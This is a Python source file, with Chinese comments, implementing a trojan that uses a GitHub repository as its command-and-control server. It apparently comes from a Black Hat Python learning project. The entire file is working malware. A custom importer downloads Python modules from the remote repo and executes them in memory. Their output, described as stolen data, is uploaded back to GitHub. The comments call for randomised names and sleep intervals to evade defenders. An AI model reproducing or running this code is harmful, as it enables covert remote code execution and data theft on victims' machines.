import github3
import base64
import importlib
import time
import json
import random
import sys
import threading


# 为当前的受害者机器实例随机生成一个唯一识别ID
trojan_id = f"victim_{random.randint(1000, 9999)}"

def github_connect():
    try:
        with open('my_token.txt', "r", encoding='utf-8') as f:
            token = f.read().strip()
    except FileNotFoundError as e:
        print(f"[-] 本地未找到token.txt，输入正确位置..")
        sys.exit(1)


    user = 'TaMoon1'
    repo_name = 'BHP-Trojan-Project'

    # 使用登录凭证初始化会话
    sess = github3.login(token=token)
    return sess.repositories(user,repo_name)

'''
    =======官方代码如下=======
def get_file_content(dirname,module_name,repo):
    return repo.file_contents(f"{dirname}/{module_name}").content
    
class Trojan:
    def get_config(self):
        config_json = get_file_content(
            'config',self.config_file,self.repo
        )

        config = json.loads(base64.b64decode(config_json))

    因为GitHub API 返回的内容是用 Base64 编码的，需要解码；
    所以这里改成get_file_content()先进行处理
'''

def get_file_contents(repo,filepath):
    try:
        contents = repo.file_contents(filepath)
        return base64.b64decode(contents.content)

    except Exception as e:
        print(f"读取{filepath}/文件错误:{e}")


def get_trojan_config(repo):
    # 远程获取配置文件
    config_json = get_file_contents(repo,"config/abc.json")
    if config_json:
        return json.loads(config_json.decode('utf-8'))

    else:
        return []


def store_module_result(repo,module_name,data):
    """将窃取到的数据伪装并上传回 GitHub 的 data 目录下"""
    # 模拟生成一个随机的文件名，防止防御人员轻易察觉规律
    remote_path = f"data/{trojan_id}/{module_name}_{int(time.time())}.txt"

    # 将回传数据进行 Base64 编码
    b64_data = base64.b64encode(data.encode('utf-8'))

    repo.create_file(
        path=remote_path,
        message="Log:Update from active agent {trojan_id}",
        content=b64_data
    )

    print(f"[*]成功将数据传回远程端...")

class GitImporter:
    """
    【核心黑客技巧】自定义包导入器
    让 Python 的 import 语句能直接去 GitHub 远程抓取代码，并在内存中加载
    """

    def __init__(self, repo):
        self.repo = repo
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        print(f"[*] 检索模块: {fullname}")

        # 去 GitHub 的 modules 目录下寻找对应的 Python 源码
        code = get_file_contents(self.repo, f"models/{fullname}.py")
        if code:
            self.current_module_code = code
            return self
        return None


    def load_module(self, fullname):
        """在内存中动态组装并激活模块"""
        # 创建一个干净的空模块对象
        new_module = sys.modules.setdefault(fullname, importlib.util.module_from_spec(
            importlib.machinery.ModuleSpec(fullname, None)
        ))
        # 执行从远程下载下来的源码，将函数和变量注入到该新模块中
        exec(self.current_module_code, new_module.__dict__)
        return new_module


def module_runner(repo,module_name):
    """多线程调用：负责执行具体的功能模块并回传数据"""
    try:
        # 这里会触发 sys.meta_path 中的 GitImporter 远程下载并加载模块
        module = importlib.import_module(module_name)

        # 调用模块中的标准入口函数 run()
        result = module.run()

        # 上传结果
        store_module_result(repo,module_name,result)

    except Exception as e:
        print(f"[-] 模块 {module_name} 执行失败: {e}")


def main():
    # 创建一个GitHub连接
    repo = github_connect()

    # 将我们的自定义远程导入器挂载到 Python 核心寻找链 (sys.meta_path) 的最前端
    sys.meta_path.insert(0, GitImporter(repo))

    while True:
        print(f"\n[*] 正在从GitHub拉取最新的命令....")

        config = get_trojan_config(repo)

        # 解析配置并利用多线程并发执行任务
        for task in config:
            target_module = task['module']
            t = threading.Thread(target=module_runner,args=(repo,target_module))
            t.start()
            time.sleep(random.randint(1,3))

            # 休眠一段时间（心跳周期），模拟正常流量避开检测
            print("[*] 任务触发完毕，进入下一轮心跳休眠期...")
            time.sleep(random.randint(10, 20))


if __name__ == "__main__":
    main()
